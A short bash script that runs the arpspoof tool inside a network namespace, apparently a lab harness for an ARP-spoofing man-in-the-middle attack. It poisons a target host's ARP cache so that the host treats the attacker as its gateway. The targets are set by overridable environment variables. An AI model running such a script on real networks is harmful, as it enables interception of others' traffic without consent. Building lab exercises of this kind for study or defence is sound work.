#!/usr/bin/env bash
set -euo pipefail

NAMESPACE="${NAMESPACE:-ns-atk}"
IFACE="${IFACE:-veth-atk}"
TARGET_IP="${TARGET_IP:-10.0.0.10}"
GATEWAY_IP="${GATEWAY_IP:-10.0.0.1}"

if [[ ${EUID} -ne 0 ]]; then
  echo "[!] Run as root (use sudo)."
  exit 1
fi

if ! command -v arpspoof >/dev/null 2>&1; then
  echo "[!] arpspoof not found. Install dsniff package."
  exit 1
fi

cat <<EOF
[+] Starting ARP spoof
    namespace: ${NAMESPACE}
    interface: ${IFACE}
    target:    ${TARGET_IP}
    gateway:   ${GATEWAY_IP}

Stop with Ctrl+C.
EOF

exec ip netns exec "${NAMESPACE}" arpspoof -i "${IFACE}" -t "${TARGET_IP}" "${GATEWAY_IP}"